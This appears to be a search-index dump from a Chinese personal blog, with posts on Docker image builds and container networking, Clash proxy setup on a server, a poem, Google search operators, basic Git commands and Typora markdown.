0:1.2300-2.el7 will be installed ---\u0026gt; Package perl-constant.noarch 0:1.27-2.el7 will be installed ---\u0026gt; Package perl-macros.x86_64 4:5.16.3-299.el7_9 will be installed ---\u0026gt; Package perl-threads.x86_64 0:1.87-4.el7 will be installed ---\u0026gt; Package perl-threads-shared.x86_64 0:1.43-6.el7 will be installed ---\u0026gt; Package vim-filesystem.x86_64 2:7.4.629-8.el7_9 will be installed --\u0026gt; Running transaction check ---\u0026gt; Package perl-Encode.x86_64 0:2.51-7.el7 will be installed ---\u0026gt; Package perl-Pod-Escapes.noarch 1:1.04-299.el7_9 will be installed ---\u0026gt; Package perl-Pod-Usage.noarch 0:1.63-3.el7 will be installed --\u0026gt; Processing Dependency: perl(Pod::Text) \u0026gt;= 3.15 for package: perl-Pod-Usage-1.63-3.el7.noarch --\u0026gt; Processing Dependency: perl-Pod-Perldoc for package: perl-Pod-Usage-1.63-3.el7.noarch ---\u0026gt; Package perl-Text-ParseWords.noarch 0:3.29-4.el7 will be installed --\u0026gt; Running transaction check ---\u0026gt; Package perl-Pod-Perldoc.noarch 0:3.20-4.el7 will be installed --\u0026gt; Processing Dependency: perl(parent) for package: perl-Pod-Perldoc-3.20-4.el7.noarch --\u0026gt; Processing Dependency: perl(HTTP::Tiny) for package: perl-Pod-Perldoc-3.20-4.el7.noarch --\u0026gt; Processing Dependency: groff-base for package: perl-Pod-Perldoc-3.20-4.el7.noarch ---\u0026gt; Package perl-podlators.noarch 0:2.5.1-3.el7 will be installed --\u0026gt; Running transaction check ---\u0026gt; Package groff-base.x86_64 0:1.22.2-8.el7 will be installed ---\u0026gt; Package perl-HTTP-Tiny.noarch 0:0.033-3.el7 will be installed ---\u0026gt; Package perl-parent.noarch 1:0.225-244.el7 will be installed --\u0026gt; Finished Dependency Resolution Dependencies Resolved ================================================================================ Package Arch Version Repository Size ================================================================================ Installing: vim-enhanced x86_64 2:7.4.629-8.el7_9 updates 1.1 M Installing for dependencies: gpm-libs x86_64 1.20.7-6.el7 base 32 k groff-base x86_64 1.22.2-8.el7 base 942 k perl x86_64 4:5.16.3-299.el7_9 updates 8.0 M perl-Carp noarch 1.26-244.el7 base 19 k perl-Encode x86_64 2.51-7.el7 base 1.5 M perl-Exporter noarch 5.68-3.el7 base 28 k perl-File-Path noarch 2.09-2.el7 base 26 k perl-File-Temp noarch 0.23.01-3.el7 base 56 k perl-Filter x86_64 1.49-3.el7 base 76 k perl-Getopt-Long noarch 2.40-3.el7 base 56 k perl-HTTP-Tiny noarch 0.033-3.el7 base 38 k perl-PathTools x86_64 3.40-5.el7 base 82 k perl-Pod-Escapes noarch 1:1.04-299.el7_9 updates 52 k perl-Pod-Perldoc noarch 3.20-4.el7 base 87 k perl-Pod-Simple noarch 1:3.28-4.el7 base 216 k perl-Pod-Usage noarch 1.63-3.el7 base 27 k perl-Scalar-List-Utils x86_64 1.27-248.el7 base 36 k perl-Socket x86_64 2.010-5.el7 base 49 k perl-Storable x86_64 2.45-3.el7 base 77 k perl-Text-ParseWords noarch 3.29-4.el7 base 14 k perl-Time-HiRes x86_64 4:1.9725-3.el7 base 45 k perl-Time-Local noarch 1.2300-2.el7 base 24 k perl-constant noarch 1.27-2.el7 base 19 k perl-libs x86_64 4:5.16.3-299.el7_9 updates 690 k perl-macros x86_64 4:5.16.3-299.el7_9 updates 44 k perl-parent noarch 1:0.225-244.el7 base 12 k perl-podlators noarch 2.5.1-3.el7 base 112 k perl-threads x86_64 1.87-4.el7 base 49 k perl-threads-shared x86_64 1.43-6.el7 base 39 k vim-common x86_64 2:7.4.629-8.el7_9 updates 5.9 M vim-filesystem x86_64 2:7.4.629-8.el7_9 updates 11 k which x86_64 2.20-7.el7 base 41 k Transaction Summary ================================================================================ Install 1 Package (+32 Dependent packages) Total download size: 19 M Installed size: 63 M Downloading packages: warning: /var/cache/yum/x86_64/7/base/packages/gpm-libs-1.20.7-6.el7.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID f4a80eb5: NOKEY Public key for gpm-libs-1.20.7-6.el7.x86_64.rpm is not installed Public key for perl-Pod-Escapes-1.04-299.el7_9.noarch.rpm is not installed -------------------------------------------------------------------------------- Total 1.3 MB/s | 19 MB 00:15 Retrieving key from file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 Importing GPG key 0xF4A80EB5: Userid : \u0026#34;CentOS-7 Key (CentOS 7 Official Signing Key) \u0026lt;security@centos.org\u0026gt;\u0026#34; Fingerprint: 6341 ab27 53d7 8a78 a7c2 7bb1 24c6 a8a7 f4a8 0eb5 Package : centos-release-7-9.2009.0.el7.centos.x86_64 (@CentOS) From : /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 Running transaction check Running transaction test Transaction test succeeded Running transaction Installing : gpm-libs-1.20.7-6.el7.x86_64 1/33 Installing : 2:vim-filesystem-7.4.629-8.el7_9.x86_64 2/33 Installing : 2:vim-common-7.4.629-8.el7_9.x86_64 3/33 Installing : which-2.20-7.el7.x86_64 4/33 install-info: No such file or directory for /usr/share/info/which.info.gz Installing : groff-base-1.22.2-8.el7.x86_64 5/33 Installing : 1:perl-parent-0.225-244.el7.noarch 6/33 Installing : perl-HTTP-Tiny-0.033-3.el7.noarch 7/33 Installing : perl-podlators-2.5.1-3.el7.noarch 8/33 Installing : perl-Pod-Perldoc-3.20-4.el7.noarch 9/33 Installing : 1:perl-Pod-Escapes-1.04-299.el7_9.noarch 10/33 Installing : perl-Encode-2.51-7.el7.x86_64 11/33 Installing : perl-Text-ParseWords-3.29-4.el7.noarch 12/33 Installing : perl-Pod-Usage-1.63-3.el7.noarch 13/33 Installing : 4:perl-macros-5.16.3-299.el7_9.x86_64 14/33 Installing : perl-Storable-2.45-3.el7.x86_64 15/33 Installing : perl-Exporter-5.68-3.el7.noarch 16/33 Installing : perl-constant-1.27-2.el7.noarch 17/33 Installing : perl-Socket-2.010-5.el7.x86_64 18/33 Installing : perl-Time-Local-1.2300-2.el7.noarch 19/33 Installing : perl-Carp-1.26-244.el7.noarch 20/33 Installing : perl-PathTools-3.40-5.el7.x86_64 21/33 Installing : perl-Scalar-List-Utils-1.27-248.el7.x86_64 22/33 Installing : 1:perl-Pod-Simple-3.28-4.el7.noarch 23/33 Installing : perl-File-Temp-0.23.01-3.el7.noarch 24/33 Installing : perl-File-Path-2.09-2.el7.noarch 25/33 Installing : perl-threads-shared-1.43-6.el7.x86_64 26/33 Installing : perl-threads-1.87-4.el7.x86_64 27/33 Installing : 4:perl-Time-HiRes-1.9725-3.el7.x86_64 28/33 Installing : perl-Filter-1.49-3.el7.x86_64 29/33 Installing : 4:perl-libs-5.16.3-299.el7_9.x86_64 30/33 Installing : perl-Getopt-Long-2.40-3.el7.noarch 31/33 Installing : 4:perl-5.16.3-299.el7_9.x86_64 32/33 Installing : 2:vim-enhanced-7.4.629-8.el7_9.x86_64 33/33 Verifying : perl-HTTP-Tiny-0.033-3.el7.noarch 1/33 Verifying : perl-threads-shared-1.43-6.el7.x86_64 2/33 Verifying : perl-Storable-2.45-3.el7.x86_64 3/33 Verifying : groff-base-1.22.2-8.el7.x86_64 4/33 Verifying : perl-Exporter-5.68-3.el7.noarch 5/33 Verifying : perl-constant-1.27-2.el7.noarch 6/33 Verifying : perl-PathTools-3.40-5.el7.x86_64 7/33 Verifying : 4:perl-macros-5.16.3-299.el7_9.x86_64 8/33 Verifying : 2:vim-enhanced-7.4.629-8.el7_9.x86_64 9/33 Verifying : 1:perl-parent-0.225-244.el7.noarch 10/33 Verifying : perl-Socket-2.010-5.el7.x86_64 11/33 Verifying : which-2.20-7.el7.x86_64 12/33 Verifying : 2:vim-filesystem-7.4.629-8.el7_9.x86_64 13/33 Verifying : perl-File-Temp-0.23.01-3.el7.noarch 14/33 Verifying : 1:perl-Pod-Simple-3.28-4.el7.noarch 15/33 Verifying : perl-Time-Local-1.2300-2.el7.noarch 16/33 Verifying : 1:perl-Pod-Escapes-1.04-299.el7_9.noarch 17/33 Verifying : perl-Carp-1.26-244.el7.noarch 18/33 Verifying : 2:vim-common-7.4.629-8.el7_9.x86_64 19/33 Verifying : perl-Scalar-List-Utils-1.27-248.el7.x86_64 20/33 Verifying : perl-Pod-Usage-1.63-3.el7.noarch 21/33 Verifying : perl-Encode-2.51-7.el7.x86_64 22/33 Verifying : perl-Pod-Perldoc-3.20-4.el7.noarch 23/33 Verifying : perl-podlators-2.5.1-3.el7.noarch 24/33 Verifying : 4:perl-5.16.3-299.el7_9.x86_64 25/33 Verifying : perl-File-Path-2.09-2.el7.noarch 26/33 Verifying : perl-threads-1.87-4.el7.x86_64 27/33 Verifying : 4:perl-Time-HiRes-1.9725-3.el7.x86_64 28/33 Verifying : gpm-libs-1.20.7-6.el7.x86_64 29/33 Verifying : perl-Filter-1.49-3.el7.x86_64 30/33 Verifying : perl-Getopt-Long-2.40-3.el7.noarch 31/33 Verifying : perl-Text-ParseWords-3.29-4.el7.noarch 32/33 Verifying : 4:perl-libs-5.16.3-299.el7_9.x86_64 33/33 Installed: vim-enhanced.x86_64 2:7.4.629-8.el7_9 Dependency Installed: gpm-libs.x86_64 0:1.20.7-6.el7 groff-base.x86_64 0:1.22.2-8.el7 perl.x86_64 4:5.16.3-299.el7_9 perl-Carp.noarch 0:1.26-244.el7 perl-Encode.x86_64 0:2.51-7.el7 perl-Exporter.noarch 0:5.68-3.el7 perl-File-Path.noarch 0:2.09-2.el7 perl-File-Temp.noarch 0:0.23.01-3.el7 perl-Filter.x86_64 0:1.49-3.el7 perl-Getopt-Long.noarch 0:2.40-3.el7 perl-HTTP-Tiny.noarch 0:0.033-3.el7 perl-PathTools.x86_64 0:3.40-5.el7 perl-Pod-Escapes.noarch 1:1.04-299.el7_9 perl-Pod-Perldoc.noarch 0:3.20-4.el7 perl-Pod-Simple.noarch 1:3.28-4.el7 perl-Pod-Usage.noarch 0:1.63-3.el7 perl-Scalar-List-Utils.x86_64 0:1.27-248.el7 perl-Socket.x86_64 0:2.010-5.el7 perl-Storable.x86_64 0:2.45-3.el7 perl-Text-ParseWords.noarch 0:3.29-4.el7 perl-Time-HiRes.x86_64 4:1.9725-3.el7 perl-Time-Local.noarch 0:1.2300-2.el7 perl-constant.noarch 0:1.27-2.el7 perl-libs.x86_64 4:5.16.3-299.el7_9 perl-macros.x86_64 4:5.16.3-299.el7_9 perl-parent.noarch 1:0.225-244.el7 perl-podlators.noarch 0:2.5.1-3.el7 perl-threads.x86_64 0:1.87-4.el7 perl-threads-shared.x86_64 0:1.43-6.el7 vim-common.x86_64 2:7.4.629-8.el7_9 vim-filesystem.x86_64 2:7.4.629-8.el7_9 which.x86_64 0:2.20-7.el7 Complete! Removing intermediate container 8ff92ad9ec1e ---\u0026gt; 8454f6fab960 Step 6/8 : RUN yum -y install net-tools ---\u0026gt; Running in 173fc318f351 Loaded plugins: fastestmirror, ovl Loading mirror speeds from cached hostfile * base: mirrors.nju.edu.cn * extras: ftp.sjtu.edu.cn * updates: ftp.sjtu.edu.cn Resolving Dependencies --\u0026gt; Running transaction check ---\u0026gt; Package net-tools.x86_64 0:2.0-0.25.20131004git.el7 will be installed --\u0026gt; Finished Dependency Resolution Dependencies Resolved ================================================================================ Package Arch Version Repository Size ================================================================================ Installing: net-tools x86_64 2.0-0.25.20131004git.el7 base 306 k Transaction Summary ================================================================================ Install 1 Package Total download size: 306 k Installed size: 917 k Downloading packages: Running transaction check Running transaction test Transaction test succeeded Running transaction Installing : net-tools-2.0-0.25.20131004git.el7.x86_64 1/1 Verifying : net-tools-2.0-0.25.20131004git.el7.x86_64 1/1 Installed: net-tools.x86_64 0:2.0-0.25.20131004git.el7 Complete! Removing intermediate container 173fc318f351 ---\u0026gt; 6a1de638647d Step 7/8 : EXPOSE 80 ---\u0026gt; Running in b307ec95e208 Removing intermediate container b307ec95e208 ---\u0026gt; 23b8c33b96c8 Step 8/8 : CMD /bin/bash ---\u0026gt; Running in 46eb85a62efa Removing intermediate container 46eb85a62efa ---\u0026gt; 847c2b869d18 Successfully built 847c2b869d18 Successfully tagged mycentos:latest   发现images列表已经有了mycentos镜像 1 2 3  $ sdr images REPOSITORY TAG IMAGE ID CREATED SIZE mycentos latest 847c2b869d18 2 minutes ago 624MB   通过docker history查看镜像构建历史 1 2 3 4 5 6 7 8 9 10 11 12  $ sdr history 847 IMAGE CREATED CREATED BY SIZE COMMENT 847c2b869d18 5 minutes ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34; \u0026#34;-c\u0026#34; \u0026#34;/bin… 0B 23b8c33b96c8 5 minutes ago /bin/sh -c #(nop) EXPOSE 80 0B 6a1de638647d 5 minutes ago /bin/sh -c yum -y install net-tools 182MB 8454f6fab960 5 minutes ago /bin/sh -c yum -y install vim 237MB 0aed096774e0 6 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0B 3c456a5a6c70 6 minutes ago /bin/sh -c #(nop) ENV MYPATH=/usr/local 0B 7cc6b3b953d1 6 minutes ago /bin/sh -c #(nop) MAINTAINER wnqinm\u0026lt;flidwal… 0B eeb6ee3f44bd 12 months ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/bash\u0026#34;] 0B \u0026lt;missing\u0026gt; 12 months ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B \u0026lt;missing\u0026gt; 12 months ago /bin/sh -c #(nop) ADD file:b3ebbe8bd304723d4… 204MB   可以通过此命令查看各种官方镜像的构建过程 发布镜像到dockerhub docker login -u 用户名 docker push 镜像 注意:镜像必须是 用户名/镜像名:tag (eg. wnqinm/nginx:latest) docker 网络 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  $ ip addr # 本机回环地址 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever # 服务器提供商(这里是腾讯云)内网地址 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 52:54:00:a8:6e:ca brd ff:ff:ff:ff:ff:ff inet 10.0.4.3/22 brd 10.0.7.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::5054:ff:fea8:6eca/64 scope link valid_lft forever preferred_lft forever # docker0地址 3: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:6c:11:67:c5 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::42:6cff:fe11:67c5/64 scope link valid_lft forever preferred_lft forever   查看一下容器内部地址 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  $ sdr ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS 9293afcf31a6 3d1465 \u0026#34;/bin/bash\u0026#34; 4 days ago Up 2 seconds # 可以在exec后直接加命令,不进入容器直接执行 $ sdr exec -it 9293 ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 92: eth0@if93: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever # 每一个容器都会有一个类似上面的eth0@if93的网卡对应的ip地址172.17.0.2/16,这是docker分配的 # ping一下 $ ping 172.17.0.2 PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data. 64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.094 ms 64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms 64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.044 ms 64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.046 ms ^C --- 172.17.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3079ms # 可以ping通 # 容器反过来ping主机 $ sdr exec -it 9293 ping 172.17.0.1 PING 172.17.0.1 (172.17.0.1) 56(84) bytes of data. 64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.055 ms 64 bytes from 172.17.0.1: icmp_seq=2 ttl=64 time=0.050 ms 64 bytes from 172.17.0.1: icmp_seq=3 ttl=64 time=0.053 ms 64 bytes from 172.17.0.1: icmp_seq=4 ttl=64 time=0.062 ms ^C --- 172.17.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3059ms # 也能ping通    原理  首先,docker0的ip:172.17.0.1,容器9293的ip:172.17.0.2,是在同一网段下的  每次运行一个容器,docker就会分配一个ip,我们只要安装了docker,就会有一个网卡docker0  桥接模式,使用的是 evth-pair 技术 再次测试ip addr:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  $ ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 52:54:00:a8:6e:ca brd ff:ff:ff:ff:ff:ff inet 10.0.4.3/22 brd 10.0.7.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::5054:ff:fea8:6eca/64 scope link valid_lft forever preferred_lft forever 3: docker0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:6c:11:67:c5 brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::42:6cff:fe11:67c5/64 scope link valid_lft forever preferred_lft forever 93: veth8b8785a@if92: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue master docker0 state UP group default link/ether 6a:fc:42:63:d2:cf brd ff:ff:ff:ff:ff:ff link-netnsid 1 inet6 fe80::68fc:42ff:fe63:d2cf/64 scope link valid_lft forever preferred_lft forever   发现多了一个网卡 可以明白容器带来的网卡，都是一对对的 evth-pair就是一对虚拟设备接口，都是成对出现的，一端连着协议，一端彼此相连 所以evth-pair被用来充当桥梁 主机上显示93: veth8b8785a@if92，93号，指向92号。而容器内显示92: eth0@if93，92号，指向93号，说明这两块网卡是互相绑定的 容器间ping  1 2 3 4 5  $ sdr exec -it 9293 ping 172.20.0.2 PING 172.20.0.2 (172.20.0.2) 56(84) bytes of data. ^C --- 172.20.0.2 ping statistics --- 8 packets transmitted, 0 received, 100% packet loss, time 7170ms   这里ping不通的原因是两个容器的ip字段不同，即不在一个网桥下 如果ping同一网桥下的容器： 1  $ sdr exec -it 9293 ping 172.17.0.3   此时就能ping通，我这里就不试了 网络模型图如下： 所有容器在不指定网络的情况下，都是docker0路由的，docker会给容器分配一个默认的可用ip ip数目：255.255.255.255/16表示前16位是域，后16位是可分配的ip，此时255.255.0.1到255.255.255.254可用ip；255.255.255.255/24表示前24位是域，后8位是可分配的ip，此时255.255.255.1到255.255.255.254是可用ip 可以通过修改/etc/hosts添加容器名实现通过容器名ping通网络 自定义网络 1 2 3 4 5 6 7  # 查看所有的docker网络 $ sdr network ls NETWORK ID NAME DRIVER SCOPE 4171a585caf4 bridge bridge local 3c8399a3e6b0 code-server_default bridge local bf9782f177ef host host local 8c71ba624052 none null local   网络模式 bridge：桥接 docker(默认) none：不配置网络 host：和宿主机共享网络 container：容器内网络连通（用的少，局限性很大） 测试 1 2 3 4  # 启动容器时可以指定网络 docker run -d -P --name tomcat01 --net bridge tomcat # 这里的bridge就是前面network ls的第一个网络 # docker0特点:默认,域名不能访问   自定义网络 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  # --driver bridge 设置网络模式 # --subnet 192.168.0.0/16 设置子网地址 # --gateway 192.168.0.1 网关 $ sdr network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet 41eac8b4e2753f31116056357cabae0efc0f34259010c2b5b9244acceac34387 $ sdr network ls NETWORK ID NAME DRIVER SCOPE 41eac8b4e275 mynet bridge local $ sdr network inspect mynet [ { \u0026#34;Name\u0026#34;: \u0026#34;mynet\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;41eac8b4e2753f31116056357cabae0efc0f34259010c2b5b9244acceac34387\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2022-09-23T15:43:55.370425457+08:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;192.168.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;192.168.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: {}, \u0026#34;Options\u0026#34;: {}, \u0026#34;Labels\u0026#34;: {} } ]   网络连通 1 2 3 4 5 6 7 8 9 10 11 12 13  $ sdr network connect --help Usage: docker network connect [OPTIONS] NETWORK CONTAINER Connect a container to a network Options: --alias strings Add network-scoped alias for the container --driver-opt strings driver options for the network --ip string IPv4 address (e.g., 172.30.100.104) --ip6 string IPv6 address (e.g., 2001:db8::33) --link list Add link to another container --link-local-ip strings Add a link-local address for the container   原理是再给容器分配一个ip地址，干脆利落直接将容器添加到其他网络中。 ","permalink":"https://WnQinm.github.io/2022/09/docker_init/","tags":["net","docker"],"title":"Docker"},{"categories":null,"contents":"第一次租云服务器，结果git clone时发现无法正常使用GitHub，无奈学习了在服务器部署clash 安装 首先在本地下载clash本体：https://github.com/Dreamacro/clash/releases 我选择的是clash-linux-amd64-v1.11.8.gz 使用xftp软件连接服务器传输文件很方便，注意服务器防火墙开启对应端口 xftp对于个人和学生有免费版，提交邮箱即可申请，会给邮箱发送下载地址 使用wsl或虚拟机在本地解压，获得一个可执行文件，我命名为cfl(clash for linux) 本地使用对应操作系统运行，会下载一些文件，如图： 复制本地的配置文件到config.yaml中 ./cfl -d .运行发现成功启动（最后有个点） 配置 clash提供了web接口方便进行管理，设置web接口的口令（登录密码） 1 2 3 4  # Clash 的 RESTful APIexternal-controller:\u0026#34;0.0.0.0:9090\u0026#34;# RESTful API口令secret:\u0026#34;xxx\u0026#34;  服务器开放9090端口访问，TCP UDP都打开 登录网站http://clash.razord.top/#/proxies host为服务器公网ip，密钥是上面的api口令，即可进行快捷切换代理，查看日志，修改端口等操作 将clash放到后台运行 nohup ./clash-linux-amd64 -d . \u0026amp; ","permalink":"https://WnQinm.github.io/2022/09/clash_linux/","tags":["net"],"title":"Clash for linux"},{"categories":["Math"],"contents":"记录大一所学的泰勒助记:  ","permalink":"https://WnQinm.github.io/2022/09/taylor/","tags":["math"],"title":"Taylor"},{"categories":null,"contents":"在b站刷到了高盛元老师的语文课，讲解燕七的鲸鱼安慰了大海   鲸鱼安慰了大海  不是所有的树 都能在自己的家乡终老 不是所有的轨道 都通往春暖花开的方向 不是所有的花都会盛开 不是所有约定的人都会到来 我知道，是流星赞美了黑夜 鲸鱼安慰了大海   回不去的永远叫家乡，就像月亮，你可以看到他，但永远够不到它，你们之间总有一段距离。 这个世界上最大的谎言就是告诉你努力一定会成功，有时候你会感觉你付出了很多，但是总是没有达到期待的样子。 爱情有时候就是这样不平等的，奥登说如果爱情注定是不平等的，那就让那爱的更多的人是我。有时候你觉得你在这段感情里面付出了好多，你放下了好多，放弃了好多，可是没有得到你需要的。 不是所有的花都会盛开的，不是所有的轨道都通往春暖花开的方向，这些是生活的真相，是你在这个世界上必须要接受的，可是没有关系，可是不是我们要抵达的那个终点，不是最后要盛开，存在就是意义。 流星它划过天空，它的终点是陨落，可是它存在的那一个瞬间，天空变得很美，是它赞美了这场黑夜。鲸鱼只是存在着，存在着在那个海洋里面，这就是意义。存在在这个世界上，这就是最大的意义。  弹幕摘录：  故乡是永远到达不了的远方，因为它早已经不是梦中的样子了 只有离开了故乡才能得到故乡 “可我们至少还可以努力” 努力是在证明你是否有成功的运气 努力不一定会有结果，倘若有，那一定是努力的结果 在黑夜孤单的一点微光，不在乎谁看到我在发亮 存在即为上上签 ","permalink":"https://WnQinm.github.io/2022/08/jyawldh/","tags":["poem"],"title":"鲸鱼安慰了大海"},{"categories":null,"contents":"类似于百度搜索，Google搜索引擎同样有高级搜索语法来提高搜素效率！  完全匹配搜索  将搜索短语包在引号中，且支持完全不完全匹配混搭： can have me \u0026ldquo;must have me\u0026rdquo;  排除搜索  减号减去不想要的东西： lose weight -advertising  或  鱼OR熊掌 或者 鱼 | 熊掌  想要搜索的词出现在网页文本中  搜索的东西都得出现在文本中 allintext:搜索文本  组合搜索（文本）  seo终极指南 intext:搜索意图 前者进行标题文本正常不完全匹配搜索，后者表示搜索意图必须文本得能不完全匹配到  title搜索  标题中得包含某些单词 allintitle:跳出率举例  组合搜索（title）  标题得有指定的词，其他的正常搜 首次输入延迟 intitle:核心网页指标提升  网站内搜索  在特定网站搜索内容,尽管该网站可能不支持搜索功能 site:www.xxx.com \u0026ldquo;内容\u0026rdquo;  类似单词或同义词搜索  要在搜索中包含一个单词，但是也希望包含相似单词或同义词的结果，在单词前加入~ \u0026ldquo;页面seo优化\u0026rdquo; ~指南  名词定义搜索  快速搜索某个单词或专业名词的定义 define:cnn 搜索关于卷积神经网络定义的页面  缺失单词搜索  一段话中忘记某个单词，可以用*作为通配符 埃克森*营销 或者 偏偏*你  特定地址的消息搜索  搜索与特定地址相关的消息，用location star wars location:London world war 2 location:China  特定文件类型搜索  搜索特定文件类型的结果，用filetype: \u0026ldquo;Quickly lose weight\u0026rdquo; filetype:ppt  快速翻译  将单词或短语翻译为另一种语言,translante: [单词] to [语言] translate: pencil to Spanish translate: search engine optimization to Russia  数字区间搜索  查找包含任意数字范围的结果，X\u0026hellip;Y president 1930\u0026hellip;2021 iphone $500\u0026hellip;$3000  多个术语或搜索运算符结合  使用括号()将多个属于或搜索运算符进行分组来控制搜索的执行方式 ","permalink":"https://WnQinm.github.io/2022/08/google_search/","tags":["search"],"title":"Google高级搜索"},{"categories":["Git"],"contents":"本文旨在帮助学习和回忆git相关命令 基本技术 git config --global user.name （user name) git config --global user.email (email) 设置本地仓库用户名和邮箱 git init初始化本地仓库 git status查看：当前所处分支，准备commit的changes，untracked files git add添加untracked file进缓存区 git commit提交，会进入编辑器提示添加commit message，可以通过git config core.editor vim将编辑器修改为vim git log查看前面的版本 source .gitignore新建文件，里面放不想推送的仓库（不想被git追踪）的文件名，坏处是一旦删除本地文件就没办法找回 git branch (branch name)创建分支 git branch查看所有分支 git checkout (branch name)切换分支 git commit -a -m (commit message)或git commit -am (commit message)同时完成add和commit操作 git branch -d (branch name)删除分支，删除还未合并(merge)的分支会删除失败 git branch -D (branch name)强制删除还未合并(merge)的分支 git checkout -b (branch name)创建新分支并马上转到新分支 git merge (branch name)把别的分支(branch name)合并到当前的分支 当merge时可能出现修改冲突，就需要手动处理（文件上会显示） git clone (url)拷贝远程仓库到本地 git remote -v查看本地仓库和哪些远程仓库有联系 git push在push时需要输入用户名和密码，用户名就是随便起的别名，标识身份用，密码时github上developer setting中的token(注意一旦设置一个新的token记得保存，不然就找不到了，就得删了token再设置新的【悲】) git fetch []将远程仓库拉到本地，可以指定某个仓库(上一条命令查看已链接的仓库)（如果链接的仓库多的话）也可以不指定 git diff (远程仓库名)/(分支名)查看区别 fetch完之后会形成一个类似独立的分支一样的版本库，用git merge [origin]/[master]将版本库拉进某个分支，origin可以是其他名字（git remote -v查看名字），master可以是其他分支名 git log也可以查看这种方式修改本地的版本历史 其他  remote相关  git remote add [shortname] [url]添加远程版本库 git remote rm name删除远程仓库 git remote rename old_name new_name修改仓库名   push相关  git push (远程主机名) (本地分支名):(远程分支名)（这个顺序也很有意思，从本地推远） 如果本地分支名和远程分支名相同则可以省略冒号：git push (远程主机名) (本地分支名)   pull相关  pull就是fetch和merge的结合 git pull (远程主机名) (远程分支名):(本地分支名)（从远程拉到本地） 如果本地分支名和远程分支名相同则可以省略冒号：git pull (远程主机名) (远程分支名)    血泪教训，最好先git clone一下再push、pull之类的，不然会有奇奇怪怪的问题 ","permalink":"https://WnQinm.github.io/2022/08/git_help/","tags":["git"],"title":"Git 简单入门"},{"categories":null,"contents":"此文适配软件 typora 的 markdown 语法 ==目录== 一级标题 （# 空格） 二级标题 三级标题 四级标题 五级标题 